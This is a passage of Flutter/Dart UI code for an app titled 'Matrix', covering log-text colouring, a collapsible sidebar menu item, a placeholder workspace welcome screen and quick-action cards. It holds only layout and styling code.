                          child: SingleChildScrollView(
                            controller: _logScrollController,
                            child: SelectableText.rich(
                              _shiroBuildLogRichText(_log),
                              style: AppTextStyles.terminal(size: 12, color: AppColors.textMuted),
                            ),
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _shiroSectionTitle(String title) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 6),
      child: Row(
        children: [
          Container(
            width: 3,
            height: 14,
            decoration: BoxDecoration(
              color: AppColors.primary.withValues(alpha: 0.6),
              borderRadius: BorderRadius.circular(2),
            ),
          ),
          const SizedBox(width: 8),
          Text(title, style: AppTextStyles.heading(size: 12, color: AppColors.textSecondary)),
        ],
      ),
    );
  }

  InputDecoration _shiroInputDecoration(String label, String hint) {
    return InputDecoration(
      labelText: label,
      hintText: hint,
      hintStyle: AppTextStyles.caption(size: 11, color: AppColors.textMuted),
      floatingLabelBehavior: FloatingLabelBehavior.always,
      isDense: true,
      contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
      border: OutlineInputBorder(borderRadius: BorderRadius.circular(8)),
      enabledBorder: OutlineInputBorder(
        borderRadius: BorderRadius.circular(8),
        borderSide: const BorderSide(color: AppColors.border),
      ),
      focusedBorder: OutlineInputBorder(
        borderRadius: BorderRadius.circular(8),
        borderSide: BorderSide(color: AppColors.primary.withValues(alpha: 0.6)),
      ),
    );
  }

  Widget _shiroActionBtn(String label, VoidCallback onPressed, {bool enabled = true}) {
    return SizedBox(
      height: 32,
      child: ElevatedButton(
        onPressed: (_running || !enabled) ? null : onPressed,
        style: ElevatedButton.styleFrom(
          textStyle: const TextStyle(fontSize: 11),
          padding: const EdgeInsets.symmetric(horizontal: 12),
        ),
        child: Text(label),
      ),
    );
  }

  Color _shiroLogLineColor(String line) {
    if (line.startsWith('[+]')) return AppColors.primary;
    if (line.startsWith('[!]')) return AppColors.red;
    if (line.startsWith('[-]')) return AppColors.textMuted;
    if (line.startsWith('[*]')) return AppColors.cyan;
    return AppColors.textSecondary;
  }

  TextSpan _shiroBuildLogRichText(String log) {
    if (log.isEmpty) {
      return TextSpan(text: '> 等待操作', style: TextStyle(color: AppColors.textMuted, fontFamily: 'Monaco'));
    }
    final lines = log.split('\n');
    final spans = <TextSpan>[];
    final baseStyle = AppTextStyles.terminal(size: 12, color: AppColors.textSecondary);
    for (var i = 0; i < lines.length; i++) {
      final line = lines[i];
      final color = _shiroLogLineColor(line);
      spans.add(TextSpan(
        text: line + (i < lines.length - 1 ? '\n' : ''),
        style: baseStyle.copyWith(
          color: color,
          fontWeight: line.startsWith('[+]') || line.startsWith('[!]') ? FontWeight.w600 : null,
        ),
      ));
    }
    return TextSpan(children: spans);
  }
}

class MenuItem {
  final IconData icon;
  final IconData selectedIcon;
  final String label;

  const MenuItem({
    required this.icon,
    required this.selectedIcon,
    required this.label,
  });
}

class _SidebarMenuItem extends StatelessWidget {
  final MenuItem item;
  final bool isSelected;
  final double expandProgress;
  final VoidCallback onTap;

  const _SidebarMenuItem({
    required this.item,
    required this.isSelected,
    required this.expandProgress,
    required this.onTap,
  });

  @override
  Widget build(BuildContext context) {
    final labelOpacity = ((expandProgress - 0.3) / 0.5).clamp(0.0, 1.0);
    final horizontalPadding = 12.0 + expandProgress * 4.0;

    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 2),
      child: Material(
        color: Colors.transparent,
        child: InkWell(
          onTap: onTap,
          borderRadius: BorderRadius.circular(8),
          child: Container(
            padding: EdgeInsets.symmetric(
              vertical: 12,
              horizontal: horizontalPadding,
            ),
            decoration: BoxDecoration(
              color: isSelected ? AppColors.bgCard : Colors.transparent,
              borderRadius: BorderRadius.circular(8),
            ),
            child: Row(
              children: [
                Icon(
                  isSelected ? item.selectedIcon : item.icon,
                  size: 22,
                  color: isSelected ? AppColors.primary : AppColors.textSecondary,
                ),
                Expanded(
                  child: Opacity(
                    opacity: labelOpacity,
                    child: Padding(
                      padding: const EdgeInsets.only(left: 12),
                      child: Text(
                        item.label,
                        style: TextStyle(
                          color: isSelected
                              ? AppColors.primary
                              : AppColors.textSecondary,
                          fontSize: 14,
                          fontWeight:
                              isSelected ? FontWeight.w500 : FontWeight.normal,
                        ),
                        overflow: TextOverflow.ellipsis,
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

/// 工作区内容区域
class _WorkspaceContent extends StatelessWidget {
  final String title;

  const _WorkspaceContent({required this.title});

  @override
  Widget build(BuildContext context) {
    return SingleChildScrollView(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          // 欢迎卡片
          Container(
            width: double.infinity,
            padding: const EdgeInsets.all(24),
            decoration: BoxDecoration(
              color: AppColors.bgCard,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(
                color: AppColors.primary.withValues(alpha: 0.5),
                width: 1,
              ),
              boxShadow: [
                BoxShadow(
                  color: AppColors.primary.withValues(alpha: 0.15),
                  blurRadius: 24,
                  spreadRadius: 0,
                ),
              ],
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  '> 欢迎使用 Matrix',
                  style: AppTextStyles.terminal(size: 22, color: AppColors.primary),
                ),
                const SizedBox(height: 8),
                Text(
                  '当前页面：$title · 开始您的工作吧',
                  style: AppTextStyles.body(size: 14, color: AppColors.textSecondary),
                ),
              ],
            ),
          ),
          const SizedBox(height: 24),
          // 快捷入口
          Text(
            '快捷入口',
            style: AppTextStyles.heading(size: 16, color: AppColors.primary),
          ),
          const SizedBox(height: 16),
          Row(
            children: [
              _QuickActionCard(
                icon: Icons.add_circle_outline,
                label: '新建',
                color: AppColors.primary,
              ),
              const SizedBox(width: 16),
              _QuickActionCard(
                icon: Icons.upload_file,
                label: '上传',
                color: AppColors.cyan,
              ),
              const SizedBox(width: 16),
              _QuickActionCard(
                icon: Icons.folder_open,
                label: '打开',
                color: AppColors.red,
              ),
            ],
          ),
          const SizedBox(height: 32),
          // 最近活动
          Text(
            '最近活动',
            style: AppTextStyles.heading(size: 16, color: AppColors.primary),
          ),
          const SizedBox(height: 16),
          Container(
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(
              color: AppColors.bgCard,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(
                color: AppColors.border,
                width: 1,
              ),
            ),
            child: Column(
              children: List.generate(
                4,
                (index) => Padding(
                  padding: const EdgeInsets.symmetric(vertical: 12),
                  child: Row(
                    children: [
                      Container(
                        width: 40,
                        height: 40,
            decoration: BoxDecoration(
              color: AppColors.bgElevated,
              borderRadius: BorderRadius.circular(8),
              border: Border.all(
                color: AppColors.primary.withValues(alpha: 0.4),
                            width: 1,
                          ),
                        ),
                        child: Icon(
                          [Icons.edit, Icons.folder, Icons.insert_drive_file, Icons.share][index],
                          color: AppColors.primary,
                          size: 20,
                        ),
                      ),
                      const SizedBox(width: 16),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              '项目文件 ${index + 1}',
                              style: AppTextStyles.body(size: 14, color: AppColors.textPrimary),
                            ),
                            Text(
                              '${2 + index} 小时前',
                              style: AppTextStyles.caption(color: AppColors.textSecondary),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

class _QuickActionCard extends StatelessWidget {
  final IconData icon;
  final String label;
  final Color color;

  const _QuickActionCard({
    required this.icon,
    required this.label,
    required this.color,
  });

  @override
  Widget build(BuildContext context) {
    return Expanded(
      child: Material(
        color: AppColors.bgCard,
        borderRadius: BorderRadius.circular(12),
        child: InkWell(
          onTap: () {},
          borderRadius: BorderRadius.circular(12),
          child: Container(
            padding: const EdgeInsets.symmetric(vertical: 20),
            decoration: BoxDecoration(
              color: AppColors.bgCard,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(
                color: AppColors.border,
                width: 1,
              ),
            ),
            child: Column(
              children: [
                Container(
                  width: 48,
                  height: 48,
                  decoration: BoxDecoration(
                    color: color.withValues(alpha: 0.15),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(
                      color: color.withValues(alpha: 0.5),
                      width: 1,
                    ),
                  ),
                  child: Icon(icon, color: color, size: 24),
                ),
                const SizedBox(height: 12),
                Text(
                  label,
                  style: AppTextStyles.body(color: AppColors.textPrimary),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}
